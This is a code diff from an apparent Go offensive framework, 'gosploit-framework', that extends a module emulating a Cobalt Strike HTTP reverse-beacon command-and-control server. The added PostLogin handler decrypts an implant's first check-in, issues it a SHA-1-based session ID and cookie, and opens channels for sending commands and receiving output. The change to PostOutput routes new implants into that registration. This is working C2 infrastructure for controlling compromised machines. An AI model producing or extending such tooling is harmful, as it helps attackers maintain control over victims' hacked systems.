@@ -1,7 +1,10 @@
 package cobaltstrike
 
 import (
+	"crypto/sha1"
 	"encoding/json"
+	"fmt"
+	"gosploit-framework/core"
 	"gosploit-framework/module/cc/cobaltstrike/command"
 	"io/ioutil"
 	"net/http"
@@ -11,7 +14,7 @@ import (
 type HttpReverseBeacon struct {
 	*Beacon
 
-	Sessions []HttpReverseSession
+	Sessions []*HttpReverseSession
 	Profile  *HttpReverseProfile
 }
 
@@ -73,6 +76,28 @@ func (cc *HttpReverseBeacon) GetCommand(w http.ResponseWriter, r *http.Request) 
 	panic(ErrRequestMissCookie)
 }
 
+func (cc *HttpReverseBeacon) PostLogin(w http.ResponseWriter, r *http.Request) {
+	data, err := ioutil.ReadAll(r.Body)
+	if err != nil {
+		return
+	}
+	plainData := cc.decrypt(data)
+	if plainData == nil {
+		return
+	}
+
+	s := sha1.New()
+	s.Write(plainData)
+	s.Write([]byte(core.RamdonString(16)))
+
+	session := &HttpReverseSession{ID: fmt.Sprintf("%x", s.Sum(nil))}
+	session.GetCommandChan = make(chan []byte)
+	session.PostOutputChan = make(chan []byte)
+	cc.Sessions = append(cc.Sessions, session)
+	w.Header().Add("Set-Cookie", fmt.Sprintf("%s=%s", cc.Profile.SessionName, session.ID))
+	w.Write(nil)
+}
+
 func (cc *HttpReverseBeacon) PostOutput(w http.ResponseWriter, r *http.Request) {
 	defer func() {
 		if r := recover(); r != nil {
@@ -81,8 +106,9 @@ func (cc *HttpReverseBeacon) PostOutput(w http.ResponseWriter, r *http.Request) 
 	}()
 
 	cookie, err := r.Cookie(cc.Profile.SessionName)
-	if err != nil {
-		panic(err)
+	if err == http.ErrNoCookie {
+		cc.PostLogin(w, r)
+		return
 	}
 	for _, session := range cc.Sessions {
 		if cookie.Value == session.ID {
